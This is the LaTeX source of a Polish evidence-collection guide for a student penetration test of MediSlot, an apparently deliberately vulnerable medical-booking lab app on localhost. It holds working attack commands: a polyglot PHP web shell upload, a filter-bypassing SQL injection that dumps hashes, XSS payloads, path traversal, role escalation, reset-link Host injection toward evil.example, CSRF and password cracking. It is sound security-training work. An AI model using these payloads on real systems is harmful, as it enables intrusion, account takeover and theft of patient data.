% Stage II: Instrukcja pozyskania dowodów (screenshotów) dla raportu MediSlot
% Build: pdflatex
\documentclass[11pt,a4paper]{article}

\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage[polish]{babel}
\usepackage[a4paper,margin=2.5cm]{geometry}
\usepackage{parskip}
\usepackage{booktabs}
\usepackage{tabularx}
\usepackage{array}
\usepackage{ragged2e}
\usepackage{enumitem}
\usepackage{xcolor}
\usepackage{listings}
\usepackage{fancyhdr}
\usepackage[hidelinks]{hyperref}

\newcolumntype{L}{>{\RaggedRight\arraybackslash}X}
\lstset{
  basicstyle=\ttfamily\footnotesize,
  breaklines=true,
  columns=fullflexible,
  frame=single,
  framesep=4pt,
  backgroundcolor=\color{gray!6},
  keepspaces=true,
}

\pagestyle{fancy}
\fancyhf{}
\fancyhead[L]{MediSlot --- Instrukcja pozyskania dowodów}
\fancyhead[R]{Etap II}
\fancyfoot[C]{\thepage}
\renewcommand{\headrulewidth}{0.4pt}

% Blok pojedynczej pozycji
\newcommand{\poz}[2]{\bigskip\noindent\textbf{\large #1}\quad\textit{#2}\par\nobreak\smallskip}

\title{\textbf{Instrukcja pozyskania dowodów (zrzutów ekranu)}\\[0.3em]
\large MediSlot --- Etap II\\[0.2em]
\normalsize Jak odtworzyć i udokumentować każdy dowód z raportu}
\author{Zespół \\ Kamil Szkarłat \textbullet{} Bartłomiej Ząbek \textbullet{} Jakub Szkaradek \textbullet{} Radosław Chruściński}
\date{26.11.2026 r.}

\begin{document}
\maketitle

\section*{Jak korzystać z tej instrukcji}
Dokument mapuje każdy identyfikator \texttt{RYS-xx} z raportu (\emph{stage-2-report}) na narzędzie
i kroki potrzebne do wykonania zrzutu ekranu. Po zrobieniu zrzutu wstaw go w raporcie w miejsce
odpowiedniego placeholdera, zamieniając \verb|\zrzut{...}{RYS-xx}| na
\verb|\includegraphics[width=0.92\textwidth]{sciezka/do/RYS-xx.png}|.

\section{Przygotowanie środowiska}
\begin{enumerate}[leftmargin=1.4cm]
  \item Uruchom lab i załaduj dane:
\begin{lstlisting}[language=bash]
docker compose up -d --build
docker compose exec php php /srv/db/seed.php   # Windows Git Bash: poprzedz MSYS_NO_PATHCONV=1
\end{lstlisting}
  \item Dostępy: aplikacja \url{http://localhost:8080}, Mailhog \url{http://localhost:8025},
  MinIO konsola \url{http://localhost:9001} (\texttt{minioadmin}/\texttt{minioadmin123}).
  \item Konta testowe: patrz Załącznik~A raportu.
  \item \textbf{Burp Suite:} ustaw przeglądarkę na proxy \texttt{127.0.0.1:8080} Burpa
  \emph{(uwaga: aplikacja też słucha na 8080 --- uruchom Burp na innym porcie, np. 8081, albo użyj
  wbudowanej przeglądarki Burpa)}. Włącz \emph{Intercept} tylko gdy potrzebny; do PoC wygodniejszy
  jest \emph{Repeater}.
  \item \textbf{Logowanie przez curl} (do PoC z wiersza poleceń):
\begin{lstlisting}[language=bash]
J=cookies.txt
curl -s -c $J -b $J http://localhost:8080/login.php -o /dev/null
curl -s -c $J -b $J --data-urlencode "email=pacjent1@novamed.lab" \
  --data-urlencode "password=Patient123!" http://localhost:8080/login.php -o /dev/null
\end{lstlisting}
\end{enumerate}

\section{Mapa pozycji}
Pełny przebieg PoC dla każdej podatności jest też w skryptach \texttt{tests/verify-task4.sh},
\texttt{verify-task5.sh}, \texttt{verify-task6.sh} --- można je uruchomić i zrzucić wynik.

% ---------------------------------------------------------------
\poz{RYS-ARCH}{nmap / docker --- potwierdzenie portów}
\textbf{Narzędzie:} \texttt{docker compose ps}, \texttt{nmap}.
\textbf{Kroki:}
\begin{lstlisting}[language=bash]
docker compose ps
nmap -p 8080,8025,9000,9001,3306,6379 localhost
\end{lstlisting}
\textbf{Dowód:} na host otwarte tylko 8080/8025/9000/9001; 3306 (MySQL) i 6379 (Redis) zamknięte.

\poz{RYS-TRIVY}{Trivy --- skan obrazu}
\textbf{Narzędzie:} Trivy. \textbf{Kroki:}
\begin{lstlisting}[language=bash]
docker run --rm -v //var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy:latest image --severity LOW,MEDIUM,HIGH,CRITICAL medislot-php:latest
\end{lstlisting}
\textbf{Dowód:} tabela z wierszem \texttt{Total: 2588 (LOW: 1013, MEDIUM: 1326, HIGH: 245, CRITICAL: 4)}
oraz przykładowe CVE 2026.

\poz{RYS-LYNIS}{Lynis --- audyt kontenera}
\textbf{Narzędzie:} Lynis. \textbf{Kroki:}
\begin{lstlisting}[language=bash]
docker run --rm medislot-php:latest sh -c \
  'apt-get update -qq && apt-get install -y -qq lynis && lynis audit system --quick --no-colors'
\end{lstlisting}
\textbf{Dowód:} linie \texttt{Hardening index : 57}, \texttt{Warnings (2)}, \texttt{Suggestions (39)}.

\poz{RYS-01}{curl / przeglądarka --- fingerprint PHP (CVE 2026)}
\textbf{Narzędzie:} \texttt{curl}, przeglądarka. \textbf{Kroki:}
\begin{lstlisting}[language=bash]
curl -sI http://localhost:8080/ | grep -i x-powered-by   # X-Powered-By: PHP/8.3.35
# oraz otworz http://localhost:8080/phpinfo.php i zrob zrzut naglowka z wersja
\end{lstlisting}
\textbf{Dowód:} nagłówek \texttt{X-Powered-By: PHP/8.3.35} oraz \texttt{phpinfo} z wersją 8.3.35
(poniżej poprawki 8.3.36).

\poz{RYS-02}{Burp Repeater / curl --- upload $\rightarrow$ RCE}
\textbf{Narzędzie:} Burp Repeater lub \texttt{curl}. \textbf{Kroki:}
\begin{enumerate}[leftmargin=1.2cm,nosep]
  \item Zaloguj się jako pacjent. Spróbuj wysłać \texttt{shell.php} (\verb|<?php echo 1;|) ---
  odpowiedź: \emph{Odrzucono}.
  \item Spróbuj \texttt{shell.phtml} bez prefiksu --- również \emph{Odrzucono}.
  \item Wyślij polyglot:
\begin{lstlisting}[language=bash]
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.phtml
curl -s -b cookies.txt -F "file=@shell.phtml;type=image/gif" http://localhost:8080/upload.php
# znajdz klucz att-NNNNNN-shell.phtml na stronie /upload.php, nastepnie:
curl -s "http://localhost:8080/uploads/att-000NNN-shell.phtml?c=id"
\end{lstlisting}
\end{enumerate}
\textbf{Dowód:} trzy odpowiedzi (odrzucenie \texttt{.php}, odrzucenie czystego \texttt{.phtml},
akceptacja polyglota) + wynik wykonania \texttt{id}.

\poz{RYS-03}{Burp Decoder/Repeater --- IDOR}
\textbf{Narzędzie:} Burp (Decoder + Repeater). \textbf{Kroki:} jako pacjent otwórz
\texttt{/note\_view.php}; skopiuj parametr \texttt{ref}, w Decoderze odkoduj (base64url) liczbę,
zwiększ ją, zakoduj ponownie i wyślij \texttt{/note\_view.php?ref=<nowy>} w Repeaterze.
\textbf{Dowód:} zwrócona notatka należąca do innego pacjenta.

\poz{RYS-04}{Burp Repeater --- eskalacja roli}
\textbf{Narzędzie:} Burp Repeater / \texttt{curl}. \textbf{Kroki:}
\begin{lstlisting}[language=bash]
curl -s -b cookies.txt --data-urlencode "phone=x" --data-urlencode "role_id=4" \
  http://localhost:8080/profile_update.php
curl -s -b cookies.txt http://localhost:8080/dashboard.php | grep -o 'badge-[a-z]*'
\end{lstlisting}
\textbf{Dowód:} przed --- \texttt{badge-patient}; po \texttt{role\_id=4} --- \texttt{badge-admin}
(panel administratora).

\poz{RYS-05}{Przeglądarka / curl --- broken access control}
\textbf{Narzędzie:} przeglądarka (sesja pacjenta) lub \texttt{curl}. \textbf{Kroki:} zalogowany
pacjent otwiera \texttt{http://localhost:8080/admin\_users.php}.
\textbf{Dowód:} pełna lista kont (w tym \texttt{admin@novamed.lab}) bez przekierowania/403.

\poz{RYS-06}{curl / Burp --- path traversal}
\textbf{Narzędzie:} \texttt{curl} / Burp Repeater. \textbf{Kroki:}
\begin{lstlisting}[language=bash]
curl -s -b cookies.txt "http://localhost:8080/download.php?file=../includes/config.php"
\end{lstlisting}
\textbf{Dowód:} źródło \texttt{config.php} z \texttt{RESET\_SALT} i danymi DB.

\poz{RYS-07}{Przeglądarka --- stored XSS}
\textbf{Narzędzie:} przeglądarka (konto lekarza + druga sesja). \textbf{Kroki:} jako lekarz zapisz
notatkę o treści \verb|<scrscriptipt>alert(7)</scrscriptipt>| (lub \verb|<svg/onload=alert(7)>|);
otwórz notatkę w innej sesji (np. administrator przez \texttt{?ref=}).
\textbf{Dowód:} wyskakujący \texttt{alert(7)} / payload w kodzie strony innego użytkownika.

\poz{RYS-08}{Mailhog + curl --- reset hasła i Host injection}
\textbf{Narzędzie:} \texttt{curl}, Mailhog, (\texttt{md5sum}). \textbf{Kroki:}
\begin{lstlisting}[language=bash]
# Host injection:
curl -s -H "Host: evil.example" --data-urlencode "email=pacjent1@novamed.lab" \
  http://localhost:8080/reset_request.php
# obejrzyj link w Mailhog: http://localhost:8025  (host = evil.example)
# Rekonstrukcja tokenu offline (salt z config.php):
UID=<id_uzytkownika>; printf "%smedislot-static-salt-2024" "$UID" | md5sum
# token akceptowany: http://localhost:8080/reset.php?u=$UID&token=<md5>
\end{lstlisting}
\textbf{Dowód:} wiadomość w Mailhog z linkiem na \texttt{evil.example}; strona \texttt{reset.php}
akceptuje odtworzony token (nie „Nieprawidłowy link resetu”).

\poz{RYS-10}{sqlmap / Burp --- SQL injection}
\textbf{Narzędzie:} \texttt{curl}/Burp (ręcznie) oraz \texttt{sqlmap} (potwierdzenie). \textbf{Kroki:}
\begin{lstlisting}[language=bash]
# recznie (dump password_hash):
curl -s -b cookies.txt --get \
  --data-urlencode "min_id=0/**/UNIUNIONON/**/SELECT/**/email,password_hash,role,full_name/**/FROM/**/users" \
  http://localhost:8080/search.php
# sqlmap (uzyj ciasteczka sesji zalogowanego konta):
sqlmap -u "http://localhost:8080/search.php?min_id=1" --cookie="PHPSESSID=..." -p min_id --batch
\end{lstlisting}
\textbf{Dowód:} skróty \texttt{password\_hash} w wyniku / raport \texttt{sqlmap} z potwierdzoną iniekcją.

\poz{RYS-11}{aws-cli / mc / curl --- publiczny bucket}
\textbf{Narzędzie:} \texttt{curl} (anonimowo), \texttt{mc} lub \texttt{aws-cli}. \textbf{Kroki:}
\begin{lstlisting}[language=bash]
curl -s -o out.pdf -w "%{http_code}\n" \
  http://localhost:9000/medislot-attachments/pacjent1/wynik-krwi-2026.pdf
\end{lstlisting}
\textbf{Dowód:} \texttt{200 OK} bez uwierzytelnienia i pobrany obiekt.

\poz{RYS-12}{Burp --- CSRF}
\textbf{Narzędzie:} Burp Repeater (lub strona PoC). \textbf{Kroki:} wyślij POST do
\texttt{/admin\_role.php} z ciasteczkiem sesji, nagłówkiem \texttt{Origin: http://evil.example}
i bez tokenu, parametry \texttt{id=<ofiara>\&role=doctor}.
\textbf{Dowód:} rola zmieniona mimo obcego \texttt{Origin} i braku tokenu CSRF.

\poz{RYS-09}{DevTools + john/hashcat --- sesje i MD5}
\textbf{Narzędzie:} DevTools przeglądarki, \texttt{john}/\texttt{hashcat}. \textbf{Kroki:} w DevTools
pokaż ciasteczko \texttt{PHPSESSID} bez flagi \texttt{HttpOnly}; skróty MD5 ze zrzutu (RYS-10) zapisz
do pliku i uruchom:
\begin{lstlisting}[language=bash]
john --format=raw-md5 hashes.txt            # lub: hashcat -m 0 hashes.txt rockyou.txt
\end{lstlisting}
\textbf{Dowód:} cookie bez \texttt{HttpOnly}; złamane hasło(a) z MD5.

\poz{RYS-15}{Burp Intruder --- enumeracja kont}
\textbf{Narzędzie:} Burp Intruder. \textbf{Kroki:} atakuj \texttt{/login.php} listą e-maili;
porównaj komunikaty „Nie znaleziono konta…” vs „Nieprawidłowe hasło…”.
\textbf{Dowód:} różne odpowiedzi ujawniające istnienie konta.

\poz{RYS-16}{curl / nikto --- ujawnienie informacji}
\textbf{Narzędzie:} \texttt{curl -I}, \texttt{nikto}. \textbf{Kroki:}
\begin{lstlisting}[language=bash]
curl -sI http://localhost:8080/login.php   # X-Powered-By, Server; brak CSP/HSTS/X-Frame-Options
# oraz http://localhost:8080/phpinfo.php
nikto -h http://localhost:8080
\end{lstlisting}
\textbf{Dowód:} nagłówki wersji obecne, nagłówki bezpieczeństwa brak; dostępne \texttt{phpinfo}.

\poz{RYS-19}{redis-cli / git --- Redis bez AUTH i sekrety}
\textbf{Narzędzie:} \texttt{redis-cli} (w sieci Compose), \texttt{git}. \textbf{Kroki:}
\begin{lstlisting}[language=bash]
docker compose exec redis redis-cli PING        # PONG (bez AUTH)
docker compose exec redis redis-cli KEYS '*'     # klucze sesji
git show HEAD:.env                               # sekrety w repo
\end{lstlisting}
\textbf{Dowód:} \texttt{PONG} i lista kluczy sesji bez hasła; zawartość \texttt{.env} w repozytorium.

\poz{RYS-ROE}{Dokumentacja --- kontakt RoE}
\textbf{Narzędzie:} kanał uzgodniony (Teams / wiadomość w repo). \textbf{Kroki:} w chwili
potwierdzenia ustalenia Critical (RCE \#2) zrób zrzut notatki/wiadomości z datą, godziną, treścią
zgłoszenia do osoby RoE (Bartłomiej Ząbek) i potwierdzeniem odbioru.
\textbf{Dowód:} zrzut kanału kontaktu zgodny z tabelą w rozdz. „Ustalenie Critical --- kontakt z RoE”.

\end{document}
